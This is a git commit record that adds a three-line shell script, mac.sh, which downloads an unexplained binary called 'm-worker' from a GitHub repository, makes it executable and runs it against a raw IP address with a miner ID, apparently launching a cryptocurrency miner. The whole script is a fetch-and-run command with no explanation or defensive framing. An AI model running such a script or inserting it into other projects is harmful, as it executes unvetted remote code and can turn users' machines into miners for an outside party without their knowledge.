c20792dfacef77b39cfb8d8b6d7d0a24c7fe6ee7
v0dev001 <v0dev001@outlook.com>
2024-11-26 19:16:14 +0530

    Create mac.sh

---
+++ mac.sh
@@ -0,0 +1,3 @@
+wget https://github.com/v0dev001/test/raw/refs/heads/main/m-worker -O worker-rs
+chmod +x worker-rs
+./worker-rs 139.59.51.161 --miner-id ho3pp-cjcyb-adqz6-6t6se-a2re5-3voph-5mkyk-vxcx6-gfnyw-mftg3-5ae
